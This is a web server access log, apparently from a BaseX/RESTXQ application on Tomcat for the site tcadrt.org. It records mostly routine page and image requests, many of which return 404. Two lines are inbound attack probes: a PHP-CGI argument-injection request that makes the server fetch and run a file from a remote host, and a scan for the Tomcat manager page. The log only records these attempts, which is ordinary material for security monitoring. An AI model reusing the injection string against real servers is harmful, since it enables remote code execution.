+00:36:41.590	129.59.122.19:37342	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:36:41.590	129.59.122.19:37342	admin	404	No function found that matches the request.	0.33 ms
+00:36:41.591	129.59.122.19:20475	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:36:41.591	129.59.122.19:20475	admin	404	No function found that matches the request.	0.33 ms
+00:36:41.612	129.59.122.19:14977	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:36:41.612	129.59.122.19:14977	admin	404	No function found that matches the request.	0.32 ms
+00:37:37.317	129.59.122.19:43996	admin	REQUEST	[GET] http://tcadrt.org/
+00:37:37.426	129.59.122.19:43996	admin	200		109.38 ms
+00:37:37.489	129.59.122.19:43996	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:37:37.489	129.59.122.19:43996	admin	404	No function found that matches the request.	0.39 ms
+00:37:37.490	129.59.122.19:1170	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:37:37.490	129.59.122.19:1170	admin	404	No function found that matches the request.	0.31 ms
+00:37:37.538	129.59.122.19:43996	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:37:37.538	129.59.122.19:43996	admin	404	No function found that matches the request.	0.33 ms
+00:37:37.567	129.59.122.19:13600	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:37:37.568	129.59.122.19:13600	admin	404	No function found that matches the request.	0.36 ms
+00:37:37.569	129.59.122.19:1170	admin	REQUEST	[GET] http://tcadrt.org/img/Lingyansi-medium.jpg
+00:37:37.569	129.59.122.19:1170	admin	404	No function found that matches the request.	0.34 ms
+00:37:37.570	129.59.122.19:43513	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:37:37.570	129.59.122.19:43513	admin	404	No function found that matches the request.	0.38 ms
+00:37:37.571	129.59.122.19:27176	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:37:37.571	129.59.122.19:27176	admin	404	No function found that matches the request.	0.33 ms
+00:37:37.572	129.59.122.19:19790	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:37:37.572	129.59.122.19:19790	admin	404	No function found that matches the request.	0.33 ms
+00:37:37.586	129.59.122.19:43996	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:37:37.587	129.59.122.19:43996	admin	404	No function found that matches the request.	0.34 ms
+00:40:01.418	129.59.122.19:39488	admin	REQUEST	[GET] http://www.tcadrt.org/
+00:40:01.552	129.59.122.19:39488	admin	200		134.09 ms
+00:40:01.612	129.59.122.19:39488	admin	REQUEST	[GET] http://www.tcadrt.org/css/tcadrt.css
+00:40:01.612	129.59.122.19:39488	admin	404	No function found that matches the request.	0.44 ms
+00:40:01.616	129.59.122.19:24097	admin	REQUEST	[GET] http://www.tcadrt.org/js/tang-song.js
+00:40:01.616	129.59.122.19:24097	admin	404	No function found that matches the request.	0.32 ms
+00:40:01.661	129.59.122.19:39488	admin	REQUEST	[GET] http://www.tcadrt.org/img/tcadrt-logo-vs.png
+00:40:01.661	129.59.122.19:39488	admin	404	No function found that matches the request.	0.46 ms
+00:40:01.688	129.59.122.19:24097	admin	REQUEST	[GET] http://www.tcadrt.org/img/Lingyansi-medium.jpg
+00:40:01.688	129.59.122.19:24097	admin	404	No function found that matches the request.	0.42 ms
+00:40:01.709	129.59.122.19:39488	admin	REQUEST	[GET] http://www.tcadrt.org/img/hart-logo.png
+00:40:01.709	129.59.122.19:39488	admin	404	No function found that matches the request.	0.4 ms
+00:40:01.732	129.59.122.19:12594	admin	REQUEST	[GET] http://www.tcadrt.org/img/neh-logo.png
+00:40:01.733	129.59.122.19:12594	admin	404	No function found that matches the request.	0.42 ms
+00:40:01.734	129.59.122.19:29272	admin	REQUEST	[GET] http://www.tcadrt.org/img/heard-library-logo.png
+00:40:01.734	129.59.122.19:29272	admin	404	No function found that matches the request.	0.35 ms
+00:40:01.735	129.59.122.19:46574	admin	REQUEST	[GET] http://www.tcadrt.org/img/gf-logo.png
+00:40:01.735	129.59.122.19:46574	admin	404	No function found that matches the request.	0.34 ms
+00:40:01.736	129.59.122.19:7217	admin	REQUEST	[GET] http://www.tcadrt.org/img/vanderbilt-cas-logo.png
+00:40:01.736	129.59.122.19:7217	admin	404	No function found that matches the request.	0.33 ms
+00:40:01.809	129.59.122.19:7217	admin	REQUEST	[GET] http://www.tcadrt.org/favicon.ico
+00:40:01.809	129.59.122.19:7217	admin	404	No function found that matches the request.	0.48 ms
+00:40:03.897	129.59.122.19:7217	admin	REQUEST	[GET] http://www.tcadrt.org/
+00:40:03.938	129.59.122.19:7217	admin	200		41.86 ms
+00:40:04.002	129.59.122.19:7217	admin	REQUEST	[GET] http://www.tcadrt.org/css/tcadrt.css
+00:40:04.002	129.59.122.19:46574	admin	REQUEST	[GET] http://www.tcadrt.org/js/tang-song.js
+00:40:04.002	129.59.122.19:46574	admin	404	No function found that matches the request.	0.32 ms
+00:40:04.003	129.59.122.19:7217	admin	404	No function found that matches the request.	1.38 ms
+00:40:04.063	129.59.122.19:7217	admin	REQUEST	[GET] http://www.tcadrt.org/img/tcadrt-logo-vs.png
+00:40:04.063	129.59.122.19:7217	admin	404	No function found that matches the request.	0.35 ms
+00:40:04.086	129.59.122.19:46574	admin	REQUEST	[GET] http://www.tcadrt.org/js/tang-song.js
+00:40:04.086	129.59.122.19:46574	admin	404	No function found that matches the request.	0.34 ms
+00:40:04.111	129.59.122.19:7217	admin	REQUEST	[GET] http://www.tcadrt.org/img/Lingyansi-medium.jpg
+00:40:04.112	129.59.122.19:7217	admin	404	No function found that matches the request.	0.36 ms
+00:40:04.135	129.59.122.19:29272	admin	REQUEST	[GET] http://www.tcadrt.org/img/heard-library-logo.png
+00:40:04.135	129.59.122.19:29272	admin	404	No function found that matches the request.	0.34 ms
+00:40:04.136	129.59.122.19:12594	admin	REQUEST	[GET] http://www.tcadrt.org/img/gf-logo.png
+00:40:04.136	129.59.122.19:12594	admin	404	No function found that matches the request.	0.32 ms
+00:40:04.137	129.59.122.19:39488	admin	REQUEST	[GET] http://www.tcadrt.org/img/vanderbilt-cas-logo.png
+00:40:04.138	129.59.122.19:39488	admin	404	No function found that matches the request.	0.33 ms
+00:40:04.138	129.59.122.19:46574	admin	REQUEST	[GET] http://www.tcadrt.org/img/neh-logo.png
+00:40:04.139	129.59.122.19:46574	admin	404	No function found that matches the request.	0.31 ms
+00:40:04.139	129.59.122.19:24097	admin	REQUEST	[GET] http://www.tcadrt.org/img/hart-logo.png
+00:40:04.140	129.59.122.19:24097	admin	404	No function found that matches the request.	0.31 ms
+00:40:04.161	129.59.122.19:7217	admin	REQUEST	[GET] http://www.tcadrt.org/img/tcadrt-logo-vs.png
+00:40:04.161	129.59.122.19:7217	admin	404	No function found that matches the request.	0.36 ms
+00:40:04.223	129.59.122.19:7217	admin	REQUEST	[GET] http://www.tcadrt.org/favicon.ico
+00:40:04.223	129.59.122.19:7217	admin	404	No function found that matches the request.	0.33 ms
+00:40:10.981	129.59.122.19:38516	admin	REQUEST	[GET] http://tcadrt.org/tool
+00:40:11.079	129.59.122.19:38516	admin	200		98.56 ms
+00:40:11.144	129.59.122.19:38516	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:40:11.144	129.59.122.19:38516	admin	404	No function found that matches the request.	0.39 ms
+00:40:11.187	129.59.122.19:50957	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:40:11.188	129.59.122.19:50957	admin	404	No function found that matches the request.	0.35 ms
+00:40:11.193	129.59.122.19:38516	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:40:11.193	129.59.122.19:38516	admin	404	No function found that matches the request.	0.34 ms
+00:40:11.240	129.59.122.19:50957	admin	REQUEST	[GET] http://tcadrt.org/img/tool-image.jpg
+00:40:11.240	129.59.122.19:38516	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:40:11.241	129.59.122.19:38516	admin	404	No function found that matches the request.	0.51 ms
+00:40:11.240	129.59.122.19:50957	admin	404	No function found that matches the request.	1.63 ms
+00:40:11.289	129.59.122.19:37614	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:40:11.289	129.59.122.19:37614	admin	404	No function found that matches the request.	0.36 ms
+00:40:11.290	129.59.122.19:47785	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:40:11.291	129.59.122.19:47785	admin	404	No function found that matches the request.	0.35 ms
+00:40:11.298	129.59.122.19:3104	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:40:11.298	129.59.122.19:3104	admin	404	No function found that matches the request.	0.33 ms
+00:40:11.299	129.59.122.19:3407	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:40:11.299	129.59.122.19:3407	admin	404	No function found that matches the request.	0.34 ms
+00:40:11.373	129.59.122.19:3407	admin	REQUEST	[GET] http://tcadrt.org/favicon.ico
+00:40:11.374	129.59.122.19:3407	admin	404	No function found that matches the request.	0.35 ms
+00:40:12.693	129.59.122.19:3407	admin	REQUEST	[GET] http://tcadrt.org/tool
+00:40:12.737	129.59.122.19:3407	admin	200		44.03 ms
+00:40:12.797	129.59.122.19:3407	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:40:12.798	129.59.122.19:3407	admin	404	No function found that matches the request.	0.42 ms
+00:40:12.798	129.59.122.19:3104	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:40:12.799	129.59.122.19:3104	admin	404	No function found that matches the request.	0.32 ms
+00:40:12.855	129.59.122.19:3104	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:40:12.855	129.59.122.19:3104	admin	404	No function found that matches the request.	0.34 ms
+00:40:12.883	129.59.122.19:3407	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:40:12.884	129.59.122.19:3407	admin	404	No function found that matches the request.	0.35 ms
+00:40:12.903	129.59.122.19:3104	admin	REQUEST	[GET] http://tcadrt.org/img/tool-image.jpg
+00:40:12.903	129.59.122.19:3104	admin	404	No function found that matches the request.	0.32 ms
+00:40:12.934	129.59.122.19:3407	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:40:12.934	129.59.122.19:3407	admin	404	No function found that matches the request.	0.37 ms
+00:40:12.935	129.59.122.19:47785	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:40:12.935	129.59.122.19:47785	admin	404	No function found that matches the request.	0.32 ms
+00:40:12.936	129.59.122.19:37614	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:40:12.937	129.59.122.19:37614	admin	404	No function found that matches the request.	0.35 ms
+00:40:12.938	129.59.122.19:38516	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:40:12.938	129.59.122.19:38516	admin	404	No function found that matches the request.	0.34 ms
+00:40:12.939	129.59.122.19:50957	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:40:12.939	129.59.122.19:50957	admin	404	No function found that matches the request.	0.34 ms
+00:40:12.951	129.59.122.19:3104	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:40:12.952	129.59.122.19:3104	admin	404	No function found that matches the request.	0.35 ms
+00:40:13.073	129.59.122.19:3104	admin	REQUEST	[GET] http://tcadrt.org/favicon.ico
+00:40:13.073	129.59.122.19:3104	admin	404	No function found that matches the request.	0.37 ms
+00:40:32.339	129.59.122.19:3104	admin	REQUEST	[GET] http://tcadrt.org/
+00:40:32.540	129.59.122.19:3104	admin	200		201.25 ms
+00:40:32.609	129.59.122.19:3104	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:40:32.609	129.59.122.19:3104	admin	404	No function found that matches the request.	0.42 ms
+00:40:32.610	129.59.122.19:50957	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:40:32.610	129.59.122.19:50957	admin	404	No function found that matches the request.	0.32 ms
+00:40:32.657	129.59.122.19:3104	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:40:32.658	129.59.122.19:3104	admin	404	No function found that matches the request.	0.33 ms
+00:40:32.689	129.59.122.19:50957	admin	REQUEST	[GET] http://tcadrt.org/img/Lingyansi-medium.jpg
+00:40:32.689	129.59.122.19:50957	admin	404	No function found that matches the request.	0.36 ms
+00:40:32.690	129.59.122.19:38516	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:40:32.690	129.59.122.19:38516	admin	404	No function found that matches the request.	0.32 ms
+00:40:32.691	129.59.122.19:47785	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:40:32.691	129.59.122.19:47785	admin	404	No function found that matches the request.	0.36 ms
+00:40:32.694	129.59.122.19:37614	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:40:32.694	129.59.122.19:37614	admin	404	No function found that matches the request.	0.32 ms
+00:40:32.697	129.59.122.19:3407	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:40:32.697	129.59.122.19:3407	admin	404	No function found that matches the request.	0.33 ms
+00:40:32.705	129.59.122.19:3104	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:40:32.705	129.59.122.19:3104	admin	404	No function found that matches the request.	0.35 ms
+00:40:59.537	191.96.249.97:55413	admin	REQUEST	[GET] http://207.58.154.226/cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n
+00:40:59.584	191.96.249.97:55413	admin	404	No function found that matches the request.	47.79 ms
+00:41:57.236	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/
+00:41:57.355	129.59.122.19:3757	admin	200		119.61 ms
+00:41:57.418	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:41:57.418	129.59.122.19:3757	admin	404	No function found that matches the request.	0.38 ms
+00:41:57.419	129.59.122.19:18446	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:41:57.419	129.59.122.19:18446	admin	404	No function found that matches the request.	0.32 ms
+00:41:57.467	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:41:57.467	129.59.122.19:3757	admin	404	No function found that matches the request.	0.37 ms
+00:41:57.490	129.59.122.19:18446	admin	REQUEST	[GET] http://tcadrt.org/img/Lingyansi-medium.jpg
+00:41:57.490	129.59.122.19:18446	admin	404	No function found that matches the request.	0.32 ms
+00:41:57.491	129.59.122.19:42263	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:41:57.491	129.59.122.19:42263	admin	404	No function found that matches the request.	0.31 ms
+00:41:57.492	129.59.122.19:25277	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:41:57.492	129.59.122.19:25277	admin	404	No function found that matches the request.	0.31 ms
+00:41:57.493	129.59.122.19:50285	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:41:57.494	129.59.122.19:50285	admin	404	No function found that matches the request.	0.33 ms
+00:41:57.494	129.59.122.19:20646	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:41:57.495	129.59.122.19:20646	admin	404	No function found that matches the request.	0.33 ms
+00:41:57.516	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:41:57.516	129.59.122.19:3757	admin	404	No function found that matches the request.	0.32 ms
+00:42:01.557	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/
+00:42:01.625	129.59.122.19:3757	admin	200		68.55 ms
+00:42:01.687	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:42:01.687	129.59.122.19:3757	admin	404	No function found that matches the request.	0.47 ms
+00:42:01.688	129.59.122.19:20646	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:42:01.688	129.59.122.19:20646	admin	404	No function found that matches the request.	0.31 ms
+00:42:01.735	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:42:01.735	129.59.122.19:3757	admin	404	No function found that matches the request.	0.44 ms
+00:42:01.762	129.59.122.19:20646	admin	REQUEST	[GET] http://tcadrt.org/img/Lingyansi-medium.jpg
+00:42:01.765	129.59.122.19:20646	admin	404	No function found that matches the request.	3.59 ms
+00:42:01.766	129.59.122.19:42263	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:42:01.766	129.59.122.19:42263	admin	404	No function found that matches the request.	3.46 ms
+00:42:01.766	129.59.122.19:25277	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:42:01.767	129.59.122.19:18446	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:42:01.767	129.59.122.19:18446	admin	404	No function found that matches the request.	3.38 ms
+00:42:01.767	129.59.122.19:50285	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:42:01.767	129.59.122.19:50285	admin	404	No function found that matches the request.	5.53 ms
+00:42:01.767	129.59.122.19:25277	admin	404	No function found that matches the request.	4.67 ms
+00:42:01.785	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:42:01.785	129.59.122.19:3757	admin	404	No function found that matches the request.	0.4 ms
+00:42:01.847	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/favicon.ico
+00:42:01.847	129.59.122.19:3757	admin	404	No function found that matches the request.	0.48 ms
+00:42:04.120	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/
+00:42:04.176	129.59.122.19:3757	admin	200		55.94 ms
+00:42:04.237	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:42:04.237	129.59.122.19:3757	admin	404	No function found that matches the request.	0.48 ms
+00:42:04.238	129.59.122.19:50285	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:42:04.238	129.59.122.19:50285	admin	404	No function found that matches the request.	0.32 ms
+00:42:04.285	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:42:04.285	129.59.122.19:3757	admin	404	No function found that matches the request.	0.41 ms
+00:42:04.311	129.59.122.19:50285	admin	REQUEST	[GET] http://tcadrt.org/img/Lingyansi-medium.jpg
+00:42:04.311	129.59.122.19:50285	admin	404	No function found that matches the request.	0.36 ms
+00:42:04.312	129.59.122.19:25277	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:42:04.312	129.59.122.19:25277	admin	404	No function found that matches the request.	0.32 ms
+00:42:04.313	129.59.122.19:18446	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:42:04.313	129.59.122.19:18446	admin	404	No function found that matches the request.	0.32 ms
+00:42:04.314	129.59.122.19:42263	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:42:04.314	129.59.122.19:42263	admin	404	No function found that matches the request.	0.31 ms
+00:42:04.315	129.59.122.19:20646	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:42:04.315	129.59.122.19:20646	admin	404	No function found that matches the request.	0.32 ms
+00:42:04.334	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:42:04.334	129.59.122.19:3757	admin	404	No function found that matches the request.	0.33 ms
+00:42:04.401	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/favicon.ico
+00:42:04.401	129.59.122.19:3757	admin	404	No function found that matches the request.	0.44 ms
+00:42:11.808	129.59.122.19:3757	admin	REQUEST	[GET] http://tcadrt.org/css/tcadrt.css
+00:42:11.843	129.59.122.19:3757	admin	404	No function found that matches the request.	35.22 ms
+00:44:04.453	129.59.122.19:6350	admin	REQUEST	[GET] http://tcadrt.org/
+00:44:04.491	129.59.122.19:6350	admin	400	Stopped at /opt/tomcat/webapps/ROOT/restxq.xqm, 6/73: [XQST0059] Imported module 'content.xqm' has unexpected namespace: 'http://tcadrt.vanderbilt.edu/content' vs 'http://tcadrt.org/content'.	38.42 ms
+00:45:08.341	129.59.122.19:16746	admin	REQUEST	[GET] http://tcadrt.org/
+00:45:08.454	129.59.122.19:16746	admin	200		113.22 ms
+00:45:08.561	129.59.122.19:46745	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:45:08.562	129.59.122.19:46745	admin	404	No function found that matches the request.	0.64 ms
+00:45:08.568	129.59.122.19:16746	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:45:08.568	129.59.122.19:16746	admin	404	No function found that matches the request.	0.65 ms
+00:45:08.615	129.59.122.19:46745	admin	REQUEST	[GET] http://tcadrt.org/img/Lingyansi-medium.jpg
+00:45:08.615	129.59.122.19:46745	admin	404	No function found that matches the request.	0.57 ms
+00:45:08.617	129.59.122.19:16746	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:45:08.618	129.59.122.19:16746	admin	404	No function found that matches the request.	0.55 ms
+00:45:08.659	129.59.122.19:22233	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:45:08.660	129.59.122.19:22233	admin	404	No function found that matches the request.	0.71 ms
+00:45:08.661	129.59.122.19:34525	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:45:08.662	129.59.122.19:34525	admin	404	No function found that matches the request.	0.73 ms
+00:45:08.663	129.59.122.19:13885	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:45:08.663	129.59.122.19:13885	admin	404	No function found that matches the request.	0.68 ms
+00:45:08.664	129.59.122.19:32453	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:45:08.665	129.59.122.19:32453	admin	404	No function found that matches the request.	0.57 ms
+00:45:20.478	129.59.122.19:32453	admin	REQUEST	[GET] http://tcadrt.org/tool
+00:45:20.613	129.59.122.19:32453	admin	200		135.71 ms
+00:45:20.681	129.59.122.19:13885	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:45:20.681	129.59.122.19:13885	admin	404	No function found that matches the request.	0.53 ms
+00:45:20.728	129.59.122.19:32453	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:45:20.728	129.59.122.19:32453	admin	404	No function found that matches the request.	0.47 ms
+00:45:20.770	129.59.122.19:22233	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:45:20.770	129.59.122.19:22233	admin	404	No function found that matches the request.	0.55 ms
+00:45:20.771	129.59.122.19:13885	admin	REQUEST	[GET] http://tcadrt.org/img/tool-image.jpg
+00:45:20.771	129.59.122.19:13885	admin	404	No function found that matches the request.	0.46 ms
+00:45:20.772	129.59.122.19:16746	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:45:20.772	129.59.122.19:16746	admin	404	No function found that matches the request.	0.47 ms
+00:45:20.773	129.59.122.19:34525	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:45:20.774	129.59.122.19:34525	admin	404	No function found that matches the request.	0.49 ms
+00:45:20.775	129.59.122.19:46745	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:45:20.775	129.59.122.19:46745	admin	404	No function found that matches the request.	0.5 ms
+00:45:20.777	129.59.122.19:32453	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:45:20.778	129.59.122.19:32453	admin	404	No function found that matches the request.	0.5 ms
+00:45:22.188	129.59.122.19:32453	admin	REQUEST	[GET] http://tcadrt.org/
+00:45:22.228	129.59.122.19:32453	admin	200		40.38 ms
+00:45:22.352	129.59.122.19:46745	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:45:22.353	129.59.122.19:46745	admin	404	No function found that matches the request.	0.74 ms
+00:45:22.354	129.59.122.19:32453	admin	REQUEST	[GET] http://tcadrt.org/js/tang-song.js
+00:45:22.354	129.59.122.19:32453	admin	404	No function found that matches the request.	0.47 ms
+00:45:22.403	129.59.122.19:46745	admin	REQUEST	[GET] http://tcadrt.org/img/Lingyansi-medium.jpg
+00:45:22.404	129.59.122.19:46745	admin	404	No function found that matches the request.	0.89 ms
+00:45:22.405	129.59.122.19:32453	admin	REQUEST	[GET] http://tcadrt.org/img/neh-logo.png
+00:45:22.406	129.59.122.19:32453	admin	404	No function found that matches the request.	0.76 ms
+00:45:22.407	129.59.122.19:34525	admin	REQUEST	[GET] http://tcadrt.org/img/heard-library-logo.png
+00:45:22.407	129.59.122.19:34525	admin	404	No function found that matches the request.	0.67 ms
+00:45:22.408	129.59.122.19:22233	admin	REQUEST	[GET] http://tcadrt.org/img/hart-logo.png
+00:45:22.408	129.59.122.19:22233	admin	404	No function found that matches the request.	0.49 ms
+00:45:22.409	129.59.122.19:13885	admin	REQUEST	[GET] http://tcadrt.org/img/vanderbilt-cas-logo.png
+00:45:22.410	129.59.122.19:13885	admin	404	No function found that matches the request.	0.51 ms
+00:45:22.411	129.59.122.19:16746	admin	REQUEST	[GET] http://tcadrt.org/img/gf-logo.png
+00:45:22.411	129.59.122.19:16746	admin	404	No function found that matches the request.	0.49 ms
+00:45:22.452	129.59.122.19:46745	admin	REQUEST	[GET] http://tcadrt.org/img/tcadrt-logo-vs.png
+00:45:22.453	129.59.122.19:46745	admin	404	No function found that matches the request.	0.64 ms
+00:47:29.860	198.186.192.44:50049	admin	REQUEST	[GET] http://www.tcadrt.org/
+00:47:31.673	198.186.192.44:50049	admin	200		1813.59 ms
+00:47:35.211	129.59.122.19:9359	admin	REQUEST	[GET] http://tcadrt.org/
+00:47:35.277	129.59.122.19:9359	admin	200		66.6 ms
+00:47:43.343	129.59.122.19:14588	admin	REQUEST	[GET] http://tcadrt.org/gom/tool
+00:47:43.444	129.59.122.19:14588	admin	404	No function found that matches the request.	101.98 ms
+00:47:57.981	129.59.122.19:14588	admin	REQUEST	[GET] http://tcadrt.org/tool
+00:47:58.152	129.59.122.19:14588	admin	200		171.22 ms
+00:50:00.591	129.59.122.19:35115	admin	REQUEST	[GET] http://tcadrt.org/tool
+00:50:00.936	129.59.122.19:35115	admin	200		345.97 ms
+00:50:06.568	129.59.122.19:31369	admin	REQUEST	[GET] http://tcadrt.org/
+00:50:06.628	129.59.122.19:31369	admin	200		59.71 ms
+00:50:09.167	129.59.122.19:31369	admin	REQUEST	[GET] http://tcadrt.org/
+00:50:09.205	129.59.122.19:31369	admin	200		38.39 ms
+00:50:09.590	129.59.122.19:32273	admin	REQUEST	[GET] http://tcadrt.org/favicon.ico
+00:50:09.590	129.59.122.19:32273	admin	404	No function found that matches the request.	0.6 ms
+00:50:11.461	129.59.122.19:32273	admin	REQUEST	[GET] http://tcadrt.org/tool
+00:50:11.533	129.59.122.19:32273	admin	200		72.35 ms
+00:50:13.857	129.59.122.19:32273	admin	REQUEST	[GET] http://tcadrt.org/
+00:50:14.131	129.59.122.19:32273	admin	200		274.4 ms
+00:50:23.636	129.59.122.19:30349	admin	REQUEST	[GET] http://www.tcadrt.org/
+00:50:23.733	129.59.122.19:30349	admin	200		96.71 ms
+00:50:24.138	129.59.122.19:30349	admin	REQUEST	[GET] http://www.tcadrt.org/favicon.ico
+00:50:24.138	129.59.122.19:30349	admin	404	No function found that matches the request.	0.8 ms
+00:50:26.616	129.59.122.19:32273	admin	REQUEST	[GET] http://tcadrt.org/tool
+00:50:26.655	129.59.122.19:32273	admin	200		39.28 ms
+00:50:27.996	129.59.122.19:32273	admin	REQUEST	[GET] http://tcadrt.org/
+00:50:28.047	129.59.122.19:32273	admin	200		51.2 ms
+01:08:47.304	129.59.122.19:37669	admin	REQUEST	[GET] http://tcadrt.org/
+01:08:47.445	129.59.122.19:37669	admin	200		141.06 ms
+01:08:51.816	129.59.122.19:37669	admin	REQUEST	[GET] http://tcadrt.org/
+01:08:51.956	129.59.122.19:37669	admin	200		140.55 ms
+01:08:53.703	129.59.122.19:37669	admin	REQUEST	[GET] http://tcadrt.org/tool
+01:08:53.753	129.59.122.19:37669	admin	200		50.56 ms
+01:09:14.331	129.59.122.19:13746	admin	REQUEST	[GET] http://tcadrt.org/
+01:09:14.416	129.59.122.19:13746	admin	200		85.18 ms
+01:10:57.258	14.152.95.39:4271	admin	REQUEST	[GET] http://207.58.154.226/manager/html
+01:10:57.289	14.152.95.39:4271	admin	404	No function found that matches the request.	31.47 ms
+01:13:21.042	129.59.122.19:45262	admin	REQUEST	[GET] http://tcadrt.org/
+01:13:21.320	129.59.122.19:45262	admin	200		277.71 ms
+01:13:39.651	129.59.122.19:45262	admin	REQUEST	[GET] http://tcadrt.org/gom/tool
+01:13:39.678	129.59.122.19:45262	admin	404	No function found that matches the request.	28.02 ms
+01:13:44.090	129.59.122.19:45262	admin	REQUEST	[GET] http://tcadrt.org/gom/tool
+01:13:44.116	129.59.122.19:45262	admin	404	No function found that matches the request.	26.47 ms
+01:13:48.483	129.59.122.19:45262	admin	REQUEST	[GET] http://tcadrt.org/ool
+01:13:48.509	129.59.122.19:45262	admin	404	No function found that matches the request.	25.5 ms
+01:13:54.274	129.59.122.19:45262	admin	REQUEST	[GET] http://tcadrt.org/tool
+01:13:54.444	129.59.122.19:45262	admin	200		169.9 ms
